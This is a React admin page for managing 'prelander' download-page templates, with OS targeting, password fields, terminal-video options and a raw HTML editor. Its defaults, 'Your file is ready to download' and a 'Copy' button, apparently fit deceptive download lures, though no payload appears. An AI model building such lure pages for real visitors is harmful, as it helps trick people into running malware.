'use client'

import { useState, useEffect, useCallback } from 'react'
import {
  Plus, Edit, Trash2, LayoutTemplate, Eye, EyeOff, Archive,
  CheckCircle, Tag, MonitorSmartphone, Monitor, Apple, Globe,
} from 'lucide-react'
import { toast } from 'sonner'
import Sidebar from '@/components/shared/Sidebar'
import { StatusBadge } from '@/components/ui/badge'
import { Spinner } from '@/components/ui/loading'
import { prlanderTemplateApi } from '@/lib/api'
import { useAuth } from '@/lib/hooks/useAuth'

// ─── types ────────────────────────────────────────────────────────────────────

interface PrlanderTemplate {
  id: string
  name: string
  description?: string | null
  os_type: 'windows' | 'mac' | 'both'
  status: 'active' | 'paused' | 'archived'
  title: string
  subtitle: string
  button_text: string
  show_password_field: boolean
  show_video: boolean
  video_url?: string | null
  tags: string[]
  notes?: string | null
  // Full source code template
  full_html_template?: string | null
  usage_count: number
  created_at?: string | null
  updated_at?: string | null
  used_by?: { id: string; name: string; lander_url: string; status: string }[]
}

const EMPTY_FORM = {
  name: '',
  description: '',
  os_type: 'both' as 'windows' | 'mac' | 'both',
  status: 'active' as 'active' | 'paused' | 'archived',
  title: 'Your file is ready to download',
  subtitle: 'Your file is prepared. Copy the link to download.',
  button_text: 'Copy',
  show_password_field: true,
  show_video: false,
  video_url: '',
  tags: '',
  notes: '',
  // Full HTML template
  full_html_template: '',
}

// ─── Os chip ──────────────────────────────────────────────────────────────────

function OsChip({ os }: { os: string }) {
  if (os === 'windows') return (
    <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-semibold bg-blue-50 text-blue-700 border border-blue-200">
      <Monitor size={11} /> Windows
    </span>
  )
  if (os === 'mac') return (
    <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-semibold bg-gray-100 text-gray-700 border border-gray-200">
      <Apple size={11} /> Mac
    </span>
  )
  return (
    <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-semibold bg-purple-50 text-purple-700 border border-purple-200">
      <Globe size={11} /> Both
    </span>
  )
}

// ─── Page ─────────────────────────────────────────────────────────────────────

export default function PrlanderTemplatesPage() {
  const { initialize } = useAuth()
  const [templates, setTemplates] = useState<PrlanderTemplate[]>([])
  const [loading, setLoading] = useState(true)
  const [statusFilter, setStatusFilter] = useState('')
  const [osFilter, setOsFilter] = useState('')
  const [modal, setModal] = useState<'create' | 'edit' | 'view' | null>(null)
  const [selected, setSelected] = useState<PrlanderTemplate | null>(null)
  const [form, setForm] = useState({ ...EMPTY_FORM })
  const [saving, setSaving] = useState(false)

  useEffect(() => { initialize() }, [initialize])

  const load = useCallback(async () => {
    setLoading(true)
    try {
      const res = await prlanderTemplateApi.getAll({
        status: statusFilter || undefined,
        os_type: osFilter || undefined,
      })
      setTemplates(res.data?.templates ?? [])
    } catch (err: any) {
      toast.error(err?.response?.data?.detail || 'Failed to load templates')
    } finally {
      setLoading(false)
    }
  }, [statusFilter, osFilter])

  useEffect(() => { load() }, [load])

  // ── helpers ────────────────────────────────────────────────────────────────

  const openCreate = () => {
    setForm({ ...EMPTY_FORM })
    setSelected(null)
    setModal('create')
  }

  const openEdit = (t: PrlanderTemplate) => {
    setSelected(t)
    setForm({
      name: t.name,
      description: t.description || '',
      os_type: t.os_type,
      status: t.status,
      title: t.title,
      subtitle: t.subtitle,
      button_text: t.button_text,
      show_password_field: t.show_password_field,
      show_video: t.show_video,
      video_url: t.video_url || '',
      tags: t.tags.join(', '),
      notes: t.notes || '',
      // Full HTML template
      full_html_template: t.full_html_template || '',
    })
    setModal('edit')
  }

  const openView = async (t: PrlanderTemplate) => {
    try {
      const res = await prlanderTemplateApi.get(t.id)
      setSelected(res.data?.template ?? t)
      setModal('view')
    } catch {
      setSelected(t)
      setModal('view')
    }
  }

  const handleSave = async () => {
    if (!form.name.trim()) { toast.error('Name is required'); return }
    setSaving(true)
    try {
      const payload = {
        name: form.name.trim(),
        description: form.description.trim() || null,
        os_type: form.os_type,
        status: form.status,
        title: form.title.trim(),
        subtitle: form.subtitle.trim(),
        button_text: form.button_text.trim(),
        show_password_field: form.show_password_field,
        show_video: form.show_video,
        video_url: form.video_url.trim() || null,
        tags: form.tags.split(',').map(t => t.trim()).filter(Boolean),
        notes: form.notes.trim() || null,
      }
      if (modal === 'edit' && selected) {
        await prlanderTemplateApi.update(selected.id, payload)
        toast.success('Template updated')
      } else {
        await prlanderTemplateApi.create(payload)
        toast.success('Template created')
      }
      setModal(null)
      load()
    } catch (err: any) {
      toast.error(err?.response?.data?.detail || 'Save failed')
    } finally {
      setSaving(false)
    }
  }

  const handleSetStatus = async (t: PrlanderTemplate, status: string) => {
    try {
      await prlanderTemplateApi.setStatus(t.id, status)
      toast.success(`Template ${status}`)
      load()
    } catch {
      toast.error('Status update failed')
    }
  }

  const handleDelete = async (t: PrlanderTemplate) => {
    if (!confirm(`Delete template "${t.name}"? Landing pages using it will lose the reference.`)) return
    try {
      await prlanderTemplateApi.delete(t.id)
      toast.success('Template deleted')
      load()
    } catch {
      toast.error('Delete failed')
    }
  }

  // ── render ─────────────────────────────────────────────────────────────────

  const inp = 'w-full px-4 py-2.5 border border-gray-200 rounded-xl text-gray-900 bg-white focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary text-sm'

  return (
    <div className="flex min-h-screen bg-[#f8f9fb]">
      <Sidebar />
      <div className="flex-1 lg:ml-64 p-6 lg:p-8 min-w-0 overflow-x-hidden">

        {/* Header */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-6 pt-12 lg:pt-0">
          <div>
            <h1 className="text-2xl font-bold text-gray-900">Prelander Templates</h1>
            <p className="text-gray-400 text-sm mt-0.5">
              Design templates for the <code className="bg-gray-100 px-1 rounded">/d/&#123;slug&#125;</code> landing page — separate from Landing Pages and Domains
            </p>
          </div>
          <button onClick={openCreate}
            className="bg-primary hover:bg-primary-dark text-white px-5 py-2.5 rounded-xl text-sm font-semibold flex items-center gap-2 self-start">
            <Plus size={18} /> Add Template
          </button>
        </div>

        {/* Filters */}
        <div className="bg-white rounded-2xl border border-gray-100 p-4 mb-6 flex flex-wrap gap-3 items-center">
          <select value={statusFilter} onChange={e => setStatusFilter(e.target.value)}
            className="px-3 py-2 border border-gray-200 rounded-xl text-sm text-gray-700 bg-white focus:outline-none focus:ring-2 focus:ring-primary/20">
            <option value="">All Status</option>
            <option value="active">Active</option>
            <option value="paused">Paused</option>
            <option value="archived">Archived</option>
          </select>
          <select value={osFilter} onChange={e => setOsFilter(e.target.value)}
            className="px-3 py-2 border border-gray-200 rounded-xl text-sm text-gray-700 bg-white focus:outline-none focus:ring-2 focus:ring-primary/20">
            <option value="">All OS</option>
            <option value="windows">Windows</option>
            <option value="mac">Mac</option>
            <option value="both">Both</option>
          </select>
          <span className="text-sm text-gray-400 ml-auto">{templates.length} template{templates.length !== 1 ? 's' : ''}</span>
        </div>

        {/* Grid */}
        {loading ? (
          <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
            {[1,2,3].map(i => <div key={i} className="shimmer h-48 rounded-2xl" />)}
          </div>
        ) : templates.length === 0 ? (
          <div className="text-center py-20 text-gray-400">
            <LayoutTemplate size={48} className="mx-auto mb-4 opacity-30" />
            <p className="text-base mb-4">No prelander templates yet</p>
            <button onClick={openCreate}
              className="bg-primary hover:bg-primary-dark text-white px-6 py-2.5 rounded-xl text-sm font-semibold inline-flex items-center gap-2">
              <Plus size={16} /> Create First Template
            </button>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
            {templates.map(t => (
              <div key={t.id} className="bg-white rounded-2xl border border-gray-100 p-5 flex flex-col gap-3 hover:shadow-md transition-shadow">
                {/* Top row */}
                <div className="flex items-start justify-between gap-2">
                  <div className="flex-1 min-w-0">
                    <p className="font-semibold text-gray-900 truncate">{t.name}</p>
                    {t.description && (
                      <p className="text-xs text-gray-400 mt-0.5 line-clamp-2">{t.description}</p>
                    )}
                  </div>
                  <StatusBadge status={t.status} />
                </div>

                {/* Chips */}
                <div className="flex flex-wrap gap-1.5">
                  <OsChip os={t.os_type} />
                  {t.show_video && (
                    <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-semibold bg-amber-50 text-amber-700 border border-amber-200">
                      📹 Video
                    </span>
                  )}
                  {t.show_password_field && (
                    <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-semibold bg-green-50 text-green-700 border border-green-200">
                      🔑 Password
                    </span>
                  )}
                </div>

                {/* Content preview */}
                <div className="bg-gray-50 rounded-xl p-3 text-xs text-gray-600 space-y-1">
                  <p><span className="text-gray-400">Title:</span> {t.title}</p>
                  <p><span className="text-gray-400">Button:</span> {t.button_text}</p>
                </div>

                {/* Usage + tags */}
                <div className="flex items-center justify-between text-xs text-gray-400">
                  <span className="flex items-center gap-1">
                    <CheckCircle size={12} className={t.usage_count > 0 ? 'text-emerald-500' : ''} />
                    Used by {t.usage_count} landing page{t.usage_count !== 1 ? 's' : ''}
                  </span>
                  {t.tags.length > 0 && (
                    <span className="flex items-center gap-1">
                      <Tag size={10} />
                      {t.tags.slice(0, 2).join(', ')}{t.tags.length > 2 ? ` +${t.tags.length - 2}` : ''}
                    </span>
                  )}
                </div>

                {/* Actions */}
                <div className="flex items-center gap-1.5 pt-1 border-t border-gray-100">
                  <button onClick={() => openView(t)}
                    className="flex-1 flex items-center justify-center gap-1.5 py-2 rounded-xl text-xs font-medium text-gray-600 hover:bg-gray-50 border border-gray-200 transition-colors">
                    <Eye size={13} /> View
                  </button>
                  <button onClick={() => openEdit(t)}
                    className="flex-1 flex items-center justify-center gap-1.5 py-2 rounded-xl text-xs font-medium text-primary hover:bg-primary/5 border border-primary/20 transition-colors">
                    <Edit size={13} /> Edit
                  </button>
                  {t.status === 'active' ? (
                    <button onClick={() => handleSetStatus(t, 'paused')} title="Pause"
                      className="p-2 rounded-xl text-amber-500 hover:bg-amber-50 border border-amber-200 transition-colors">
                      <EyeOff size={13} />
                    </button>
                  ) : t.status === 'paused' ? (
                    <button onClick={() => handleSetStatus(t, 'active')} title="Activate"
                      className="p-2 rounded-xl text-emerald-600 hover:bg-emerald-50 border border-emerald-200 transition-colors">
                      <Eye size={13} />
                    </button>
                  ) : null}
                  {t.status !== 'archived' && (
                    <button onClick={() => handleSetStatus(t, 'archived')} title="Archive"
                      className="p-2 rounded-xl text-gray-400 hover:bg-gray-50 border border-gray-200 transition-colors">
                      <Archive size={13} />
                    </button>
                  )}
                  <button onClick={() => handleDelete(t)} title="Delete"
                    className="p-2 rounded-xl text-red-400 hover:bg-red-50 border border-red-200 transition-colors">
                    <Trash2 size={13} />
                  </button>
                </div>
              </div>
            ))}
          </div>
        )}

        {/* ── Create / Edit Modal ─────────────────────────────────────────── */}
        {(modal === 'create' || modal === 'edit') && (
          <div className="fixed inset-0 bg-black/40 backdrop-blur-sm z-50 flex items-center justify-center p-4">
            <div className="bg-white rounded-2xl p-6 w-full max-w-xl shadow-2xl border border-gray-100 max-h-[92vh] overflow-y-auto">
              <h3 className="text-lg font-bold text-gray-900 mb-5">
                {modal === 'create' ? 'Create Prelander Template' : `Edit — ${selected?.name}`}
              </h3>

              <div className="space-y-4">
                {/* Name */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">Template Name <span className="text-red-500">*</span></label>
                  <input value={form.name} onChange={e => setForm(p => ({ ...p, name: e.target.value }))}
                    placeholder="e.g. Windows Download v2" className={inp} />
                </div>

                {/* Description */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">Description</label>
                  <input value={form.description} onChange={e => setForm(p => ({ ...p, description: e.target.value }))}
                    placeholder="Optional short description" className={inp} />
                </div>

                {/* OS type + Status */}
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">OS Target</label>
                    <select value={form.os_type} onChange={e => setForm(p => ({ ...p, os_type: e.target.value as typeof form.os_type }))} className={inp}>
                      <option value="both">Both (auto-detect)</option>
                      <option value="windows">Windows only</option>
                      <option value="mac">Mac only</option>
                    </select>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Status</label>
                    <select value={form.status} onChange={e => setForm(p => ({ ...p, status: e.target.value as typeof form.status }))} className={inp}>
                      <option value="active">Active</option>
                      <option value="paused">Paused</option>
                      <option value="archived">Archived</option>
                    </select>
                  </div>
                </div>

                {/* Page content */}
                <div className="border border-gray-200 rounded-xl p-4 space-y-3">
                  <p className="text-xs font-semibold text-gray-500 uppercase tracking-wide">Page Content</p>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Headline / Title</label>
                    <input value={form.title} onChange={e => setForm(p => ({ ...p, title: e.target.value }))} className={inp} />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Subtitle</label>
                    <input value={form.subtitle} onChange={e => setForm(p => ({ ...p, subtitle: e.target.value }))} className={inp} />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Button Text</label>
                    <input value={form.button_text} onChange={e => setForm(p => ({ ...p, button_text: e.target.value }))} className={inp} />
                  </div>
                </div>

                {/* Toggles */}
                <div className="flex flex-wrap gap-4">
                  <label className="flex items-center gap-2.5 cursor-pointer select-none">
                    <input type="checkbox" checked={form.show_password_field}
                      onChange={e => setForm(p => ({ ...p, show_password_field: e.target.checked }))}
                      className="rounded border-gray-300 text-primary focus:ring-primary/30 w-4 h-4" />
                    <span className="text-sm text-gray-700">Show password field</span>
                  </label>
                  <label className="flex items-center gap-2.5 cursor-pointer select-none">
                    <input type="checkbox" checked={form.show_video}
                      onChange={e => setForm(p => ({ ...p, show_video: e.target.checked }))}
                      className="rounded border-gray-300 text-primary focus:ring-primary/30 w-4 h-4" />
                    <span className="text-sm text-gray-700">Show video tutorial</span>
                  </label>
                </div>

                {form.show_video && (
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">Video URL</label>
                    <input value={form.video_url} onChange={e => setForm(p => ({ ...p, video_url: e.target.value }))}
                      placeholder="https://... or /terminal.mp4" className={inp} />
                  </div>
                )}

                {/* Tags */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Tags <span className="text-gray-400 font-normal">(comma-separated)</span>
                  </label>
                  <input value={form.tags} onChange={e => setForm(p => ({ ...p, tags: e.target.value }))}
                    placeholder="windows, download, v2" className={inp} />
                </div>

                {/* Notes */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">Internal Notes</label>
                  <textarea value={form.notes} onChange={e => setForm(p => ({ ...p, notes: e.target.value }))}
                    rows={2} placeholder="Optional admin notes" className={inp} />
                </div>

                {/* Full Source Code Editor */}
                <div className="border border-gray-200 rounded-xl p-4 space-y-4">
                  <div className="flex items-center justify-between">
                    <p className="text-sm font-semibold text-gray-700">Full Source Code Template</p>
                    <span className="text-xs text-gray-400">Complete HTML/CSS/JS</span>
                  </div>
                  
                  <div className="bg-amber-50 border border-amber-200 rounded-lg p-3 text-sm text-amber-800">
                    <p className="font-semibold mb-1">⚠️ Advanced Template Editor</p>
                    <p>Paste your complete HTML template below. This replaces all default styling and layout. 
                    Ensure you include click-tracking parameters and platform link handling.</p>
                  </div>
                  
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Complete HTML Template
                    </label>
                    <textarea 
                      value={form.full_html_template} 
                      onChange={e => setForm(p => ({ ...p, full_html_template: e.target.value }))}
                      rows={20} 
                      placeholder={`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{TITLE}}</title>
    <style>
        /* Your custom CSS here */
        body { 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 20px;
            background: #f5f5f5;
        }
        .container { 
            max-width: 600px; 
            margin: 0 auto; 
            background: white; 
            padding: 40px;
            border-radius: 10px;
        }
        .btn { 
            background: #007bff; 
            color: white; 
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>{{TITLE}}</h1>
        <p>{{SUBTITLE}}</p>
        
        <!-- Your custom content here -->
        <div class="download-section">
            <input type="password" placeholder="Enter password" id="password" />
            <button class="btn" onclick="handleClick()">{{BUTTON_TEXT}}</button>
        </div>
    </div>
    
    <script>
        // REQUIRED: Platform click tracking
        function handleClick() {
            // Your custom logic here
            console.log('Template clicked');
            
            // IMPORTANT: Include platform tracking
            window.location.href = '{{CLICK_URL}}';
        }
        
        // IMPORTANT: OS detection and platform parameters
        const platform = navigator.platform.toLowerCase();
        const isWindows = platform.includes('win');
        const isMac = platform.includes('mac');
        
        // Apply OS-specific logic if needed
        if (isWindows) {
            document.body.classList.add('windows');
        } else if (isMac) {
            document.body.classList.add('mac');
        }
    </script>
</body>
</html>`}
                      className="w-full px-3 py-2 border border-gray-200 rounded-lg text-sm font-mono resize-none focus:outline-none focus:ring-2 focus:ring-primary/30"
                    />
                    <div className="mt-2 text-xs text-gray-500 space-y-1">
                      <p><strong>Available Variables:</strong></p>
                      <p>• <code>&#123;&#123;TITLE&#125;&#125;</code> - Template title</p>
                      <p>• <code>&#123;&#123;SUBTITLE&#125;&#125;</code> - Template subtitle</p>
                      <p>• <code>&#123;&#123;BUTTON_TEXT&#125;&#125;</code> - Button text</p>
                      <p>• <code>&#123;&#123;CLICK_URL&#125;&#125;</code> - Platform click tracking URL</p>
                      <p><strong>Note:</strong> Click tracking and OS detection must be preserved</p>
                    </div>
                  </div>
                </div>
              </div>

              <div className="flex gap-3 mt-6">
                <button onClick={handleSave} disabled={saving || !form.name.trim()}
                  className="flex-1 bg-primary hover:bg-primary-dark text-white py-2.5 rounded-xl text-sm font-semibold flex items-center justify-center gap-2 disabled:bg-gray-300">
                  {saving ? <Spinner size={16} /> : (modal === 'create' ? 'Create Template' : 'Save Changes')}
                </button>
                <button onClick={() => setModal(null)}
                  className="flex-1 py-2.5 rounded-xl text-sm font-medium text-gray-600 border border-gray-200 hover:bg-gray-50">
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ── View Details Modal ──────────────────────────────────────────── */}
        {modal === 'view' && selected && (
          <div className="fixed inset-0 bg-black/40 backdrop-blur-sm z-50 flex items-center justify-center p-4">
            <div className="bg-white rounded-2xl p-6 w-full max-w-lg shadow-2xl border border-gray-100 max-h-[90vh] overflow-y-auto">
              <div className="flex items-start justify-between gap-3 mb-5">
                <div>
                  <h3 className="text-lg font-bold text-gray-900">{selected.name}</h3>
                  {selected.description && <p className="text-sm text-gray-400 mt-0.5">{selected.description}</p>}
                </div>
                <StatusBadge status={selected.status} />
              </div>

              <div className="space-y-4">
                <div className="flex flex-wrap gap-2">
                  <OsChip os={selected.os_type} />
                  {selected.show_video && <span className="text-xs px-2 py-0.5 rounded-full bg-amber-50 text-amber-700 border border-amber-200">📹 Video</span>}
                  {selected.show_password_field && <span className="text-xs px-2 py-0.5 rounded-full bg-green-50 text-green-700 border border-green-200">🔑 Password</span>}
                </div>

                <div className="grid grid-cols-1 gap-2">
                  {[
                    { label: 'Title', value: selected.title },
                    { label: 'Subtitle', value: selected.subtitle },
                    { label: 'Button', value: selected.button_text },
                  ].map(row => (
                    <div key={row.label} className="flex gap-2 text-sm">
                      <span className="text-gray-400 min-w-[64px]">{row.label}:</span>
                      <span className="text-gray-900">{row.value}</span>
                    </div>
                  ))}
                  {selected.video_url && (
                    <div className="flex gap-2 text-sm">
                      <span className="text-gray-400 min-w-[64px]">Video:</span>
                      <a href={selected.video_url} target="_blank" rel="noreferrer"
                        className="text-primary hover:underline truncate">{selected.video_url}</a>
                    </div>
                  )}
                </div>

                {selected.tags.length > 0 && (
                  <div className="flex flex-wrap gap-1.5">
                    {selected.tags.map(tag => (
                      <span key={tag} className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] bg-gray-100 text-gray-600">
                        <Tag size={10} /> {tag}
                      </span>
                    ))}
                  </div>
                )}

                {/* Landing pages using this template */}
                {(selected.used_by?.length ?? 0) > 0 && (
                  <div>
                    <p className="text-sm font-semibold text-gray-700 mb-2">
                      Used by {selected.used_by!.length} landing page{selected.used_by!.length !== 1 ? 's' : ''}
                    </p>
                    <div className="space-y-1.5">
                      {selected.used_by!.map(lp => (
                        <div key={lp.id} className="flex items-center justify-between px-3 py-2 rounded-xl bg-gray-50 border border-gray-100 text-xs">
                          <span className="font-medium text-gray-800">{lp.name}</span>
                          <StatusBadge status={lp.status} />
                        </div>
                      ))}
                    </div>
                  </div>
                )}
                {(selected.used_by?.length ?? 0) === 0 && (
                  <p className="text-sm text-gray-400 italic">Not assigned to any landing page yet.</p>
                )}

                {selected.notes && (
                  <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 text-sm text-amber-800">
                    <span className="font-semibold">Notes: </span>{selected.notes}
                  </div>
                )}

                <p className="text-xs text-gray-400">
                  Created: {selected.created_at ? new Date(selected.created_at).toLocaleDateString() : '—'}
                  &nbsp;·&nbsp;
                  Updated: {selected.updated_at ? new Date(selected.updated_at).toLocaleDateString() : '—'}
                </p>
              </div>

              <div className="flex gap-3 mt-6">
                <button onClick={() => { setModal(null); openEdit(selected) }}
                  className="flex-1 bg-primary hover:bg-primary-dark text-white py-2.5 rounded-xl text-sm font-semibold flex items-center justify-center gap-2">
                  <Edit size={15} /> Edit Template
                </button>
                <button onClick={() => setModal(null)}
                  className="flex-1 py-2.5 rounded-xl text-sm font-medium text-gray-600 border border-gray-200 hover:bg-gray-50">
                  Close
                </button>
              </div>
            </div>
          </div>
        )}

      </div>
    </div>
  )
}
